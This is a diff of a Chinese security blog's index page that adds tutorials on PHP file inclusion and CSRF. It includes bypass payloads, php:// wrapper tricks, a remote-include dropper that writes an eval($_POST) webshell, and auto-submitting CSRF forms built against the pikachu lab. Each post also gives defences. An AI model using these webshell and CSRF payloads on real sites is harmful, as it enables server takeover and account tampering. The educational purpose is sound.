@@ -79,7 +79,7 @@
             
 		</nav>
 		<nav>
-   			 总文章数 7
+   			 总文章数 9
 		</nav>
 
 		<nav class="header-nav">
@@ -167,6 +167,209 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-文件包含漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>关于文件包含漏洞，我觉得和ssrf漏洞有点儿像，ssrf漏洞是通过curl()函数获取信息但是没有进行过滤，从而访问到内网造成危害，文件包含漏洞则是通过include()函数获取文件，攻击者输入敏感文件导致敏感文件也被输出从而产生危害。</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为包含。</p>
+<p>为了使代码更加灵活，通常会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p>
+<p>PHP中提供了四种文件包含函数:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()<span class="comment">//只有程序执行到include()函数时，才包含文件，发生错误代码也继续向下执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>()<span class="comment">//与include()相同，但是重复调用同一个文件时，程序只调用一次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>()<span class="comment">//与include()区别在于包含文件如果发生错误，程序则终止执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>()<span class="comment">//与include_once和include的区别相同</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="文件包含类型"><a href="#文件包含类型" class="headerlink" title="文件包含类型"></a>文件包含类型</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><pre><code>当本地存在敏感文件时，包含本地的文件，就是本地文件包含(就是字面意思)
+例如下面有一个含有文件包含的PHP文件
+</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span>=_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>而就在相同目录下有这样一个3.txt文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们在url上输入?file=3.txt<br><img src="https://img-blog.csdnimg.cn/c1438a33fde3428b81c28061554556b3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>就读取到了该文件的内容，需要注意的时，虽然我们读取的文件时txt文件，但是include的函数会先用php解析一遍(哪怕是jpg,png也不例外)，如果可以运行那么就当作php文件输出，如果不行就直接输出文本，</p>
+<p>像这类情况通常是出现在有文件上传功能的网页中，当用户上传了图片，或者是文本时，当用户需要读取该文件时，假如服务器后端没有对GET获取的file过滤，那么就有可能造成用户任意读取文件。</p>
+<h3 id="有限制的本地文件包含漏洞绕过"><a href="#有限制的本地文件包含漏洞绕过" class="headerlink" title="有限制的本地文件包含漏洞绕过"></a>有限制的本地文件包含漏洞绕过</h3><p>假如服务器在后端进行了过滤，常用的绕过方法有%00截断，路劲长度截断文件包含，点号阶段文件包含</p>
+<ol>
+<li><p>%00截断<br>当服务器在后端会默认给你文件添加后缀时，%00是结束符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>,<span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当以上这种情况，文件名为%00可以讲后面的.html截断(00截断的使用条件是PHP版本低于5.3且php.ini中magic_quotes_gpc=off)</p>
+</li>
+<li><p>路径长度截断文件包含(./和.截断)<br>操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=1.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span></span><br><span class="line"></span><br><span class="line">执行完成后成功截断后面的.html扩展名，包含了<span class="number">1</span>.txt文件</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>大概意思意思就是在文件名后面加若干个./，目录名有一个最大长度，当目录名超过这个最大长度，超过部分就不会被系统读取。</p>
+<p>weindows下目录最大路劲为256B、linux为4096B<br>也就是在版本低于5.3的情况下，Windows下连续240个点（.）或者(./)可以截断，Linux下连续2038个/.可以截断。</p>
+<ol start="3">
+<li>远程包含的?截断<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>,<span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+在上面这段代码中，我们在testrfi.com主机的Web目录下创建phpinfo.txt，提交请求127.0.0.1/test.php?url=phpinfo.txt?后发现返回了主机的phpinfo信息。这是因为服务器解析的内容为127.0.0.1/test.php?url=phpinfo.txt?.php，它把?后面的内容作为了参数，因此实现了截断。<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2>远程文件包含首先需要在php.ini中开启下面的配置<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = Off //把Off改成On</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>简单来说，就是服务器通过include()函数，包含了别的网页的某个目录的文件</p>
+<p>例如我在url上输入 ?file=192.168.0.2/web/.1.txt</p>
+<p>最后就会输出1.txt文件，这里也不多演示了，原理很简单。</p>
+<h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><p>上文我们说了可以访问别的网站目录下的文件，利用这一点，我们可以做一个一句话shell<br>简单理解就是运行的其他网页的代码内容是：在当前目录创建一个1.php文件，文件内容<?php @eval($_POST['shell']?></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&#x27;shell&#x27;])?&gt;&quot;</span></span><br><span class="line"><span class="variable">$myfile</span>=fopen(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$payload</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>之后就可以通过蚁剑连接了</p>
+<h3 id="有限制的远程文件包含"><a href="#有限制的远程文件包含" class="headerlink" title="有限制的远程文件包含"></a>有限制的远程文件包含</h3><p>指当进行远程文件包含时遇到过滤或者是添加扩展名<br><strong>漏洞代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">     <span class="keyword">include</span>(<span class="variable">$filename</span>.”.html”);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>?绕过<br>?filename=<a target="_blank" rel="noopener" href="http://192.168.1.110/xiaohua.txt">http://192.168.1.110/xiaohua.txt</a>?</li>
+<li>#绕过<br>?filename=<a target="_blank" rel="noopener" href="http://192.168.1.110/xiaohua.txt%23(#%E5%8F%B7%E8%A6%81%E7%BC%96%E7%A0%81)">http://192.168.1.110/xiaohua.txt%23(#号要编码)</a></li>
+<li>空格绕过<br>?filename=<a target="_blank" rel="noopener" href="http://192.168.1.110/xiaohua.txt%20(%20%E6%98%AF%E7%A9%BA%E6%A0%BC%E7%9A%84url%E7%BC%96%E7%A0%81)">http://192.168.1.110/xiaohua.txt%20(%20是空格的url编码)</a></li>
+</ol>
+<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>php伪协议不陌生了，在ssrf漏洞中也有用到<br>php自带了很多url风格的封装协议，在文件包含时也可以利用这些伪协议</p>
+<p><img src="https://img-blog.csdnimg.cn/9e80d5f8c2d34f25894ad0395c231510.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_10,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h2 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php://伪协议"></a>php://伪协议</h2><p>首先伪协议运行是有条件的，在php.ini中下面两个配置必许是On状态</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include=on</span><br><span class="line"></span><br><span class="line">allow_url_fopen=on </span><br></pre></td></tr></table></figure>
+
+<p><strong>1、php://fiter</strong><br>使用方法</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(1):filename=php://filter/read=convert.base64-encode/resource=xx.php</span><br><span class="line">(2):filename=php://filter/convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure>
+<p>read=convert.base64-encode的意思是把文件base64编码后输出文件，主要是防止文件中有类似于//这种注释，或者不能显现出来的字符，直接输出base64编码就能全部把文件代码显示出来。</p>
+<p><strong>2、php://input</strong><br>我的理解是php://input伪协议可以把文件上传的POST数据当作php代码使用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br></pre></td></tr></table></figure>
+<p>例如我们在POST中输入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;dir&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>页面就会返回当前目录所有的目录文件</p>
+<p>也可以像远程文件包含那样注入shell</p>
+<p><strong>3、file://</strong><br>可以访问本地文件系统，读取文件内容<br>使用方法:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/file.php?filename=file://C:\phpStudy\PHPTutorial\WWW\xiaohua.txt</span><br></pre></td></tr></table></figure>
+<p>这个协议可以任意内网中的文件，在ssrf漏洞中也有用到</p>
+<p><strong>4、data://</strong><br>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码<br>使用方法:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><ol>
+<li><p>进行文件过滤，尽量采用白名单的方法，安全度更高</p>
+</li>
+<li><p>修改php.ini配置文件，关闭不必要的协议</p>
+</li>
+<li><p>本地目录不要放不安全的文件，防止被本地文件包含 </p>
+</li>
+<li><p>路径限制，一定要禁止目录跳转符，例如/./ 或者是..等等</p>
+</li>
+</ol>
+<p>学习参考:<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12216170.html">文件包含漏洞1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/richardlee97/p/10542057.html">文件包含漏洞2</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-csrf" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>跨站请求伪造(CSRF)的攻击方式简单理解就是：攻击者盗用了用户的身份，以用户身份向客户端发送请求并被执行。造成的后果有：以用户名义发送信息，或者是修改信息、发送购物请求等。</p>
+<h2 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h2><p>在用户登录网页时，服务器往往会生成一个cookie,在服务器内部，记下了客户端的ip，当客户端的ip带着这个cookid再一次访问该网页时，用户就不需要重复登录操作了，一进入网页就是登录状态，而当生成的cookie时间到期时，用户再一次访问就又需要登录了。</p>
+<p>CSRF漏洞就是黑客在用户的cookie未到期之前，让用户点击一个url，然后黑客在网页中放置恶意代码，从而向攻击网站发送请求。</p>
+<h2 id="CSRF实战-GET"><a href="#CSRF实战-GET" class="headerlink" title="CSRF实战(GET)"></a>CSRF实战(GET)</h2><p>光说原理可能有点儿绕，直接本地搭建靶场来理解(pikachu 靶场)。</p>
+<p>这里有一个用户登录后修改个人信息的网页，</p>
+<p><img src="https://img-blog.csdnimg.cn/1687a8562c464ad98714b539f87d943e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>当我们把信息修改后，提交抓包观察后发现，就是简单的通过get传入信息，进行修改</p>
+<p><img src="https://img-blog.csdnimg.cn/a82025d5cafe498fb538ff88fa552ad8.png" alt="在这里插入图片描述"><br>那么我们可以构造一个payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.126/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=123&amp;phonenum=456&amp;add=789&amp;email=456&amp;submit=submit</span><br></pre></td></tr></table></figure>
+<p>这是一串url,当一个啥也不懂的小白在自己登录账号后，并且cooie为过期的情况下点击了这个连接，那么他的信息就已经被修改了，这种方式 太明显了，稍微懂一点网络安全的人通过判断url?后面的那串字符都不会点击</p>
+<p>然而道高一尺魔高一丈，假如黑客自己在服务器上搭建了一个网页，假设域名就是<a target="_blank" rel="noopener" href="http://www.abcd113.com,看着很正常对吧,然而网页内部有这么一串代码,当用户点击网页后,这串代码就自动执行了/">www.abcd113.com，看着很正常对吧，然而网页内部有这么一串代码,当用户点击网页后，这串代码就自动执行了</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://192.168.0.126:8081//pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex</span>=<span class="string">girl&amp;phonenum</span>=<span class="string">ss&amp;add</span>=<span class="string">789&amp;email</span>=<span class="string">456&amp;submit</span>=<span class="string">submit</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里我建立了一个1.html</p>
+<p><img src="https://img-blog.csdnimg.cn/34baf20c27ed4289a987f7fa137a8389.png" alt="在这里插入图片描述"></p>
+<p>打开网页后发现啥也没有，但是此时网页已经以用户身份给攻击网站发送了请求，个人信息已经被修改了，通过这种方式就可以做到神不知鬼不觉，被修改后用户自己甚至还察觉不到原因。</p>
+<p><img src="https://img-blog.csdnimg.cn/63ff6e20aaa34639961661309cc9cff9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/71c18e18261e40d6871142ba576645ec.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>以上的方式是通过GET方式进行跨站请求，简单的甚至不需要自己搭建网站就能够完成攻击</p>
+<h2 id="SSRF-POST"><a href="#SSRF-POST" class="headerlink" title="SSRF POST"></a>SSRF POST</h2><p>上面我们是通过get 的方式达到跨站请求效果，这次如果服务器使用POST来接收修改信息，我们同样可以使用通过建立网站，内部创造一个表单达到攻击目的。</p>
+<p>这次通过抓包，发现是POST提交方式<br><img src="https://img-blog.csdnimg.cn/21fd909f0f0a4cde90b08994a73e0a6c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_13,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>但这样同样有攻击漏洞，攻击者同样可以创造一个<a target="_blank" rel="noopener" href="http://www.abcd123.com域名的网站/">www.abcd123.com域名的网站</a></p>
+<p>在网站内部可以加入以下表单</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.0.126:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;boy&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;54213&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sdsd&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当用户点击这个url，也就是<a target="_blank" rel="noopener" href="http://www.abc123.com时,网站同样也会遭受攻击/">www.abc123.com时，网站同样也会遭受攻击</a></p>
+<h2 id="如何防范CSRF"><a href="#如何防范CSRF" class="headerlink" title="如何防范CSRF"></a>如何防范CSRF</h2><p>简单讲述了什么是CSRF，接下来重点便是怎么防护<br>从上面案例也知道，当修改信息时，如果不做任何防护手段很容易被恶意修改。倘若是购物软件，甚至可以利用该漏洞达到请求下单的目的。</p>
+<p>那么如何防范有下面这几个方式</p>
+<ol>
+<li>验证HTTP Referer来源<br>在HTTP报文中，Referer是用来记录这条报文的请求地址，假如我们是银行，当用户提交转账申请时，可以追溯报文中的Referer，设置一个白名单，仅允许来源是银行的URL来请求申请，防止第三方黑客网页，跨站请求。</li>
+<li>POST提交<br>同样假设我们是银行服务器，上个方法追溯到了Referer的来源，基本屏蔽了大部分的跨站请求，但是这种方法就相当于把安全交给了HTTP协议，自身网页仍然是有漏洞。有些公司，为了防止内网某些信息泄露，甚至在浏览器上拒绝提供Refer(现在浏览器是有拒绝Refer选项的)，若是网页收到这些没有Refer的用户的请求，自动认为是CSRF攻击，这种方法终究不是最保险的。</li>
+<li>在请求地址种加入token<br>我的理解是，当用户获取一个表单，比如说打开了银行的转账界面，这时银行会先生成一个随机的Token值，然后把页面返回给用户，当用户提交申请时就会自动带着这个token值，服务器会拦截这个token值然后二者比对，相同后才会执行用户请求，由于token是随机的，黑客也不容易伪造。</li>
+</ol>
+<p>下面是我觉得写的特别好的两篇关于CSRF的博客(别人大佬写的)</p>
+<p>这一篇把CSRF原理讲的特别地透<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅析CSRF攻击方式</a></p>
+<p>这一篇我认为关于如何防范CSRF漏洞讲的特别好<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/stpeace/article/details/53512283">CSRF攻击与防御</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/30/csrf/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
     <article id="post-sssrf漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -552,82 +755,6 @@
 
 
   
-    <article id="post-SQL注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5/">sql注入漏洞原理</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2021-07-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>sql注入是当今web最具有危害的漏洞之一，在web漏洞里出现的次数可以说是名列前茅<br>本文主要是讲述sql注入漏洞的原理，这个漏洞是如何产生，以及如何防范sql漏洞</p>
-        
-          <a class="article-more-a" style="display: none;" href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-SQL注入实例分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -675,6 +802,82 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-SQL注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5/">sql注入漏洞原理</a>
+    </h1>
+  
+
+        
+        <a href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-07-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>sql注入是当今web最具有危害的漏洞之一，在web漏洞里出现的次数可以说是名列前茅<br>本文主要是讲述sql注入漏洞的原理，这个漏洞是如何产生，以及如何防范sql漏洞</p>
+        
